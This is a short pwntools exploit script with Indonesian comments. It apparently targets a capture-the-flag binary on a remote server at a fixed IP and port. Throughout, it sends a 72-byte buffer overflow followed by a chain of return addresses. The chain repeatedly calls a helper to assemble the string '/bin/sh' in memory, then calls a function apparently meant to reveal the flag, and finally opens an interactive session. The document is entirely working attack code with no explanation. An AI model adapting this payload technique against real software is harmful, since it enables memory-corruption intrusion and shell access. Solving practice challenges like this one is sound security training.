from pwn import *

p = remote("103.200.7.150",31002)
#info variables di main untuk melihat variables global
#x/wx <address yang dah dapet dari info variables
#info funtions x/wx <addr>
junk = "A"*72
ramuan = 0x0804854d
x = 0xdeadbeef
ret = 0x0804836e
slash = 0x08048670
binsh = 0x0804a03c
binn = 0x08048672
sh = 0x08048676
#tambahin /
payload = junk
payload += p32(ramuan)
payload += p32(ret)
payload += p32(x)
payload += p32(binsh)
payload += p32(slash)

#tambahin bin
payload += p32(ramuan)
payload += p32(ret)
payload += p32(x)
payload += p32(binsh+1)
payload += p32(binn)
#tambahin /
payload += p32(ramuan)
payload += p32(ret)
payload += p32(x)
payload += p32(binsh+4)
payload += p32(slash)
#tambahin sh
payload += p32(ramuan)
payload += p32(ret)
payload += p32(x)
payload += p32(binsh+5)
payload += p32(sh)

#flag
payload += p32(0x08048516)
payload += p32(0x41414141)
payload += p32(0xfacebabe)
payload += p32(0xbeefdead)

p.sendline(payload)
p.recv(1024)
p.interactive()
